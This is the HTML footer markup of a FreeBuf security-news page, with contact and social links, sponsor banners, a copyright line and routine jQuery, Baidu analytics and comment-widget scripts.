        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"><img src="http://image.3001.net/images/ad/ali.png"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"><img src="http://image.3001.net/images/ad/upyun.png"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"><img src="http://image.3001.net/images/ad/ad-yzcx.png"></a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <ul>
      </ul>
    </div>
    <div class="footer-logo  pull-right"><img src="http://image.3001.net/images/index/freebufrobot_shendanjie.png" ></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright &copy; 2017 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="http://image.3001.net/images/new/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools"><a id="scrollUp" href="javascript:;" title="飞回顶部"></a></div>
<!----------footer end----------> 
<script src="http://static.3001.net/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<img alt='css.php' src="http://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1002055558" width='1' height='1' /><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type='text/javascript' src='http://static.3001.net/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3'></script>
</body>
</html>
